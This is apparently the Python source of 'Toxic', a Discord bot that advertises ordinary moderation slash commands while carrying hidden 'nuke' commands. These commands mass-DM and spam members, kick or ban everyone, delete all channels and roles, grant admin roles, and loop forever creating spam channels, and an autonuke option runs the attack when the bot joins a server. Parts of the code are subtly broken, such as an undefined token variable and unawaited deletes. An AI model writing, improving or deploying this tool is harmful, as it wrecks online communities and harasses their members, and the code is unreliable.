import discord
import asyncio
import time
import datetime
import random
from discord import option
from discord.ext import commands
from discord import Webhook
import aiohttp
import os
import urllib.request
from discord.utils import get
from discord import TextChannel
import requests
import json
from discord.ext.commands import cooldown, BucketType
import colorama
from colorama import Fore, Back

colorama.init(autoreset=True)

def wait(aaa):
    time.sleep(aaa)

prefix = ""
rolename = ""
status = ""
nickname = ""
autonuke = ""
spammessage = ""
channelname = ""
adminname = ""
clientid = ""
dmmessage = ""
topic = ""
servername = ""
token = ""

# %Boot%
valid_hex = '0123456789ABCDEF'.__contains__
def cleanhex(data):
    return ''.join(filter(valid_hex, data.upper()))

def fore_fromhex(text, hexcode):
    hexint = int(cleanhex(hexcode), 16)
    lol = "{: ^" + str(os.get_terminal_size().columns) +"s}"
    print("\x1B[38;2;{};{};{}m{}\x1B[0m".format(hexint>>16, hexint>>8&0xFF, hexint&0xFF, lol.format(text)))

def lolzy(text):
    hexcode = '#FFA500'
    hexint = int(cleanhex(hexcode), 16)
    aaa = input("\x1B[38;2;{};{};{}m{}\x1B[0m".format(hexint>>16, hexint>>8&0xFF, hexint&0xFF, text))
    return aaa

def fore_fromhex4(text, hexcode):
    hexint = int(cleanhex(hexcode), 16)
    lol = text * os.get_terminal_size().columns
    print("\x1B[38;2;{};{};{}m{}\x1B[0m".format(hexint>>16, hexint>>8&0xFF, hexint&0xFF, lol))

def fore_fromhex3(text, hexcode):
    hexint = int(cleanhex(hexcode), 16)
    lol = "{:>" + str(os.get_terminal_size().columns) +"}"
    print("\x1B[38;2;{};{};{}m{}\x1B[0m".format(hexint>>16, hexint>>8&0xFF, hexint&0xFF, lol.format(text)))

def fore_fromhex2(text, hexcode):
    hexint = int(cleanhex(hexcode), 16)
    print("\x1B[38;2;{};{};{}m{}\x1B[0m".format(hexint>>16, hexint>>8&0xFF, hexint&0xFF, text))

def mainload():
    os.system('cls')
    fore_fromhex('▄▄▄█████▓ ▒█████  ▒██   ██▒ ██▓ ▄████▄  ', '#98EDAF')
    fore_fromhex('▓  ██▒ ▓▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▒██▀ ▀█  ', '#89F0A4')
    fore_fromhex('▒ ▓██░ ▒░▒██░  ██▒░░  █   ░▒██▒▒▓█    ▄ ', '#7AF09A')
    fore_fromhex('░ ▓██▓ ░ ▒██   ██░ ░ █ █ ▒ ░██░▒▓▓▄ ▄██▒', '#66ED8A')
    fore_fromhex('  ▒██▒ ░ ░ ████▓▒░▒██▒ ▒██▒░██░▒ ▓███▀ ░', '#56E37C') #lol
    fore_fromhex('  ▒ ░░   ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░ ░▒ ▒  ░', '#4BD670')
    fore_fromhex('    ░      ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░  ░  ▒   ', '#3FD166')
    fore_fromhex('  ░      ░ ░ ░ ▒   ░    ░   ▒ ░░        ', '#2EC958')
    fore_fromhex('             ░ ░   ░    ░   ░  ░ ░      ', '#1CB845')
    print('')
    print('======================================')
    print('=                                    =')
    print('= [1] Load settings from JSON file   =')
    print('= [2] Create JSON file               =')
    print('= [3] Credits                        =')
    print('= [4] Exit                           =')
    print('=                                    =')
    print('======================================')
    lol = input("[?] Input >")
    if lol == "1":
        loadjson()
    if lol == "2":
        createjson()
    if lol == "3":
        credit()
    if lol == "4":
        os._exit(1)

def loadjson():
    os.system('cls')
    aaa = lolzy("[?] What is the name of the file? (Exclude the .json extension) >")
    try:
        with open(str(aaa) + ".json","r") as f:
            lol = json.load(f)
        try:
            global prefix
            global rolename
            global status
            global nickname
            global autonuke
            global spammessage
            global channelname
            global adminname
            global clientid
            global dmmessage
            global topic
            global servername
            global token
            prefix = lol["prefix"]
            rolename = lol["role name"]
            status = lol["status"]
            nickname = lol["nickname"]
            autonuke = lol["autonuke"]
            spammessage = lol["spam message"]
            channelname = lol["channel name"]
            adminname = lol["admin role name"]
            clientid = lol["client id"]
            dmmessage = lol["dm message"]
            topic = lol["channel topic"]
            servername = lol["server name"]
            token = lol["token"]
            print(Fore.GREEN + "[/] Loading bot..")
        except KeyError:
            print(Fore.RED + f"[-] ERROR: {aaa}.json has incorrect data. Please try copying the json here (https://amweird.neocities.org/lolol.css) and filling out your settings, then reselect this option.")
            a = input("[X] Press enter to go back")
            os.system('cls')
            mainload()
    except Exception as e:
        print(Fore.RED + f"[-] ERROR: {aaa}.json does not exist. Please try moving the JSON to the same folder that this is file is in, and reselect this option.")
        a = input("[X] Press enter to go back")
        os.system('cls')
        mainload()
        
def createjson():
    os.system('cls')
    name = lolzy("[?] What should this json be called? (Exclude the .json extention) >")
    f = open(f"{name}.json", "x")
    f = open(f"{name}.json", "w")
    prefix = lolzy("[?] What should the prefix be? >")
    rolename = lolzy("[?] What should the role name be (when !roles is ran)? >")
    status = lolzy("[?] What should the status be (Ex. 'Playing __')? >")
    nickname = lolzy("[?] What should the nickname be (when !nickall is ran)? >")
    autonuke = lolzy("[?] Should the bot automatically nuke on join? [Y/N] >")
    if autonuke in ["Y", "y", "yes", "Yes", "YES"]:
        autonuke = "true"
    if autonuke in ["N", "n", "no", "No", "NO"]:
        autonuke = "false"
    else:
        autonuke = "false"
    spammessage = lolzy("[?] What should the spam message be? >")
    channelname = lolzy("[?] What should the channel name be? (INCLUDE THE DASHES) >")
    adminname = lolzy("[?] What should the admin role name be (when !admin is ran)? >")
    clientid = lolzy("[?] What is your bot's client id? (You can find this on the discord developer portal) >")
    dmmessage = lolzy("[?] What should the dm message be (when !dmall is ran)? >")
    topic = lolzy("[?] What should the channel topic be (when spam channels are made)? >")
    servername = lolzy("[?] What should the server be renamed to when nuked? >")
    token = lolzy("[?] What is the token of your bot? >")
    f.write('{' + f'"prefix": "{prefix}", "role name": "{rolename}", "status": "{status}", "nickname": "{nickname}", "autonuke": {autonuke}, "spam message": "{spammessage}", "channel name": "{channelname}", "admin role name": "{adminname}", "client id": "{clientid}", "dm message": "{dmmessage}", "channel topic": "{topic}", "server name": "{servername}", "token": "{token}"' + "}")
    f.close()
    print(Fore.GREEN + "[+] Settings sucessfully saved! Please go back to the menu and load the json.")
    a = input(Fore.RED + "[X] Press enter to go back")
    os.system('cls')
    mainload()

def credit():
    os.system('cls')
    fore_fromhex('▄▄▄█████▓ ▒█████  ▒██   ██▒ ██▓ ▄████▄  ', '#98EDAF')
    fore_fromhex('▓  ██▒ ▓▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▒██▀ ▀█  ', '#89F0A4')
    fore_fromhex('▒ ▓██░ ▒░▒██░  ██▒░░  █   ░▒██▒▒▓█    ▄ ', '#7AF09A')
    fore_fromhex('░ ▓██▓ ░ ▒██   ██░ ░ █ █ ▒ ░██░▒▓▓▄ ▄██▒', '#66ED8A')
    fore_fromhex('  ▒██▒ ░ ░ ████▓▒░▒██▒ ▒██▒░██░▒ ▓███▀ ░', '#56E37C') #lol
    fore_fromhex('  ▒ ░░   ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░ ░▒ ▒  ░', '#4BD670')
    fore_fromhex('    ░      ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░  ░  ▒   ', '#3FD166')
    fore_fromhex('  ░      ░ ░ ░ ▒   ░    ░   ▒ ░░        ', '#2EC958')
    wait(2)
    fore_fromhex('================Credits!================', '#1CB845')
    print("""


    """)
    fore_fromhex2('▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒', '#56E37C')
    wait(0.5)
    fore_fromhex2('▒                   💻                 ▒', '#56E37C')
    wait(0.5)
    fore_fromhex2('▒  Programmer: amweird.neocities.org   ▒', '#56E37C')
    wait(0.5)
    fore_fromhex2('▒                   💻                 ▒', '#56E37C')
    wait(0.5)
    fore_fromhex2('▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒', '#56E37C')
    print("""


    """)
    fore_fromhex3('▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒', '#56E37C')
    wait(0.5)
    fore_fromhex3('▒                   🔌                 ▒', '#56E37C')
    wait(0.5)
    fore_fromhex3('▒          Discord.py: rapptz          ▒', '#56E37C')
    wait(0.5)
    fore_fromhex3('▒                   🔌                 ▒', '#56E37C')
    wait(0.5)
    fore_fromhex('▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒', '#56E37C')
    print("""


    """)
    wait(0.5)
    fore_fromhex4('▒', '#56E37C')
    wait(0.5)
    fore_fromhex('Special Thanks:', '#56E37C')
    wait(0.5)
    fore_fromhex('Izzo8 (let me test the nuke on his server)', '#56E37C')
    wait(0.5)
    fore_fromhex('Blossom, Sai, Midnight & others (close friends who have tested the bot)', '#56E37C')
    wait(0.5)
    fore_fromhex('You!! ^^ (Thanks for supporting the project!)', '#56E37C')
    wait(0.5)
    fore_fromhex4('▒', '#56E37C')
    print("""


    """)
    l = input(Fore.GREEN + "[X] Press enter to go back!")
    os.system('cls')
    mainload()
    
# %%

mainload()

client = commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),case_insensitive=True)

client.remove_command("help")

@client.event
async def on_ready():
    activity = discord.Game(name=status, type=3)
    await client.change_presence(status=discord.Status.idle, activity=activity)
    print(Fore.GREEN + "[+] Success! Toxic is now running.")

a = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
    "rules_channel_id": None,
    "public_updates_channel_id": None
}

headers = {
  "Authorization": f"Bot {TOKEN}" 
}

async def disablecc(ctx):
    G = ctx.guild.id
    try:  
        r = requests.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{G}", headers=headers, json=a)
        s = [200, 201, 204]
        if r.status_code == 429:
            b = r.json()
            print(f"Rate limited, retrying in {b['retry_after']} seconds")
            time.sleep(b['retry_after'])
    except Exception as e:
        print(f"encountered an error lol || {e}")

@client.event
async def on_guild_join(server):
    if autonuke == "true":
        await disablecc()
        await server.edit(name=servername)
        for chan in server.channels:
            try:
                await chan.delete
            except:
                pass
        while True:
            channel = await server.create_text_channel(channelname, topic=topic)


@client.slash_command(name="echo", description="Says something you say.")
@option(name="speech", description="What you want the bot to say")
async def echo(ctx, speech):
    embed = discord.Embed(
        colour = discord.Colour.blue(),
        title = f'"{speech}"',
        description = f"-{ctx.author}"
    )
    await ctx.respond(embed=embed)

@client.slash_command(name="ping", description="Pong!") 
async def ping(ctx):
    embed = discord.Embed(
        colour = discord.Colour.blue(),
        title = "Pong!",
        description = f"✅ | Bot is running and active! \n✅ | Ping is {round(client.latency, 1) * 1000}"
    )
    await ctx.respond(embed=embed)

@client.slash_command(name="help", description="Get help on some commands")
async def help(ctx):
    embed = discord.Embed(
        colour = discord.Colour.blue()
    )
    embed.add_field(name='/ping', value='Pong!', inline=False)
    embed.add_field(name='/kick', value='Kicks specified user', inline=False)
    embed.add_field(name='/ban', value='Bans specified user', inline=False)
    embed.add_field(name='/info', value='Gives information of a user', inline=False)
    embed.add_field(name='/invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name='/clear', value='Clears an X amount of messages', inline=False)
    embed.add_field(name='/help', value='Shows this embed', inline=False)
    embed.add_field(name='/create', value='Creates a channel', inline=False)
    await ctx.respond(embed=embed)

@client.slash_command(name="create", description="Creates a channel")
@commands.has_permissions(manage_channels=True)
async def create(ctx, name):
    await ctx.guild.create_text_channel(name)
    await ctx.respond(f"Created a channel named {name}", ephemeral = True)

@client.slash_command(name="clear", description="Clears an X amount of messages")
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount=10):
    await ctx.defer()
    number = int(amount)
    await ctx.channel.purge(limit=number)
    embed = discord.Embed(
        colour = discord.Colour.blue(),
        title = "Messages deleted!",
        description = f"Queued by {ctx.author}"
    )
    await ctx.send(embed=embed)

@client.slash_command(name="info", description="Gives information of a user")
async def info(ctx, user: discord.Member):
    embed = discord.Embed(
        colour = discord.Colour.blue(),
        title = user.name
    )
    embed.add_field(name='ID', value=str(user.id), inline=False)
    embed.add_field(name='Highest Role', value=str(user.top_role), inline=False)
    embed.add_field(name='Joined At', value=str(user.joined_at), inline=False)
    embed.add_field(name='Created At', value=str(user.created_at), inline=False)
    embed.add_field(name='Status', value=str(user.status), inline=False)
    await ctx.respond(embed=embed)

@client.slash_command(name="kick", description="Kicks specified user")
@option(name="member", description="The member to kick")
async def kick(ctx, member: discord.Member, *, reason=None):
    try:
        if ctx.author.guild_permissions.kick_members:
            await member.kick(reason=reason)
            embed = discord.Embed(
                colour = discord.Colour.blue(),
                title = f"{member} was kicked!"
            )
            await ctx.respond(embed=embed)
        else:
            embed = discord.Embed(
                colour = discord.Colour.blue(),
                title = "You dont have kick permissions."
            )
            await ctx.respond(embed=embed, ephemeral = True)
    except discord.Forbidden:
        embed = discord.Embed(
            colour = discord.Colour.blue(),
            title = "I dont have kick permissions."
        )
        await ctx.respond(embed=embed, ephemeral = True)

@client.slash_command(name="ban", description="Bans a specified user")
@option(name="member", description="The member to ban")
async def ban(ctx, member: discord.Member, *, reason=None):
    try:
        if ctx.author.guild_permissions.ban_members:
            await member.ban(reason=reason)
            embed = discord.Embed(
                colour = discord.Colour.blue(),
                title = f"{member} was banned!"
            )
            await ctx.respond(embed=embed)
        else:
            embed = discord.Embed(
                colour = discord.Colour.blue(),
                title = "You dont have ban permissions."
            )
            await ctx.respond(embed=embed, ephemeral = True)
    except discord.Forbidden:
        embed = discord.Embed(
            colour = discord.Colour.blue(),
            title = "I dont have ban permissions."
        )
        await ctx.respond(embed=embed, ephemeral = True)

@client.slash_command(name="invite", description="Sends an invite")
async def invite(ctx):
    await ctx.respond(f"https://discord.com/api/oauth2/authorize?client_id={clientid}&permissions=8&scope=bot", ephemeral = True)

#Nuking Commands! 

@client.command(pass_context=True)
async def dmall(ctx):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(dmmessage)
                print(Fore.GREEN + f"[+] Sent {user.name} a DM.")
            except:
                print(Fore.RED + f"[-] Couldn't DM {user.name}.")

@client.command()
async def nukehelp(ctx):
    global prefix
    await ctx.message.delete()
    embed=discord.Embed(title="Nuke Help", description="Help, but for nuke commands!", color=0x5e0000)
    embed.add_field(name=f'{prefix}dmall', value='DMs the whole server.', inline=False)
    embed.add_field(name=f'{prefix}kickall', value='Kicks everyone the server.', inline=False)
    embed.add_field(name=f'{prefix}banall', value='Bans everyone the server.', inline=False)
    embed.add_field(name=f'{prefix}nickall', value='Nicknames everyone the server.', inline=False)
    embed.add_field(name=f'{prefix}admin', value='Makes an admin role, then gives it to you.', inline=False)
    embed.add_field(name=f'{prefix}adminall', value='Makes an admin role, then gives it to everyone.', inline=False)
    embed.add_field(name=f'{prefix}kaboom', value='Basically destroys the server.', inline=False)
    embed.add_field(name=f'{prefix}delroles', value='Deletes all roles.', inline=False)
    embed.add_field(name=f'{prefix}delchannels', value='Deletes all channels.', inline=False)
    embed.add_field(name=f'{prefix}roles', value=f"Deletes all roles, then adds a bunch more named '{rolename}'.", inline=False)
    embed.set_footer(text="And, of course, the slash commands..")
    await ctx.author.send(embed=embed)
        

@client.command(pass_context=True)
async def kickall(ctx):
        await ctx.message.delete()
        for user in list(ctx.message.guild.members):
            try:
                await user.kick()
                print(Fore.GREEN + "[+] User " + user.name + " has been kicked from " + ctx.message.guild.name)
            except Forbidden:
                print(Fore.RED + "[-] User " + user.name + " cannot be kicked from " + ctx.message.guild.name)

@client.command()
async def nickall(ctx):
     await ctx.message.delete()
     for member in ctx.guild.members:
        if member == client.user:
             pass
        else:
            try:
                 await member.edit(nick=nickname)
                 print(Fore.GREEN + f"[+] Edited {member}'s nickname to {nickname}")
            except Exception as e:
                 print(Fore.RED + f"[-] Couldn't edit {member}'s nickname | {e}")

@client.command()
async def delchannels(ctx):
    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass
        
@client.command(pass_context=True)
@commands.cooldown(1, 30, commands.BucketType.user)
async def kaboom(ctx):
        await ctx.message.delete()
        await disablecc()
        await ctx.guild.edit(name=servername)
        for chan in ctx.guild.channels:
            try:
                await chan.delete
            except:
                pass
        while True:
            channel = await ctx.guild.create_text_channel(channelname, topic=topic)
    
@client.event
async def on_guild_channel_create(channel):
    if channel.name == channelname:
        while True:
            await channel.send(spammessage)
    else:
        pass

@client.command()
async def banall(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try:
                if member == ctx.author:
                    pass
                else: 
                    await member.ban()
                    print(Fore.GREEN + "[+] User " + user.name + " has been kicked from " + ctx.message.guild.name)
            except Exception as e:
                print(Fore.RED + "[-] User " + user.name + " cannot be kicked from " + ctx.message.guild.name + "because of" + e)
    
@client.command(pass_context=True)
async def admin(ctx):
        await ctx.message.delete()
        perms = discord.Permissions(8)
        guild = ctx.guild
        await guild.create_role(name=adminname, permissions=perms)
        user = ctx.author
        role = discord.utils.get(user.guild.roles, name=adminname)
        await user.add_roles(role)
        print(Fore.GREEN + "[+] Gave you admin! You're welcome!")

@client.command(pass_context=True)
async def adminall(ctx):
        await ctx.message.delete()
        perms = discord.Permissions(8)
        guild = ctx.guild
        user = ctx.author
        try:
            role = discord.utils.get(ctx.guild.roles, name=rolename)
        except:
            await guild.create_role(name=adminname, permissions=perms)
        role = discord.utils.get(user.guild.roles, name=adminname)
        for member in ctx.guild.members:
            try:
                await member.add_roles(role)
                print(Fore.GREEN + f"[+] Successfully gave {member} admin!")
            except Exception as e:
                print(Fore.RED + f"[-] Unable to adminify {member} {e}")

@client.command(pass_context=True)
async def delroles(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:  
        try:  
            await role.delete()
        except Exception as e:
            print(Fore.RED + f"[-] Couldn't delete {role.name} | {e}")

@client.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:  
        try:  
            await role.delete()
            print(Fore.GREEN + f"[+] Sucessfully deleted {role.name}")
        except Exception as e:
            print(Fore.RED + f"[-] Couldn't delete {role.name} | {e}")
    while True:
        await ctx.guild.create_role(name=rolename)
        role = discord.utils.get(ctx.guild.roles, name=rolename)
        for member in ctx.guild.members:
            try:
                await member.add_roles(role)
                print(Fore.GREEN + f"[+] Successfully gave {member} a role!")
            except Exception as e:
                print(Fore.RED + f"[-] Unable to role-ify {member} | {e}")

client.run(token)
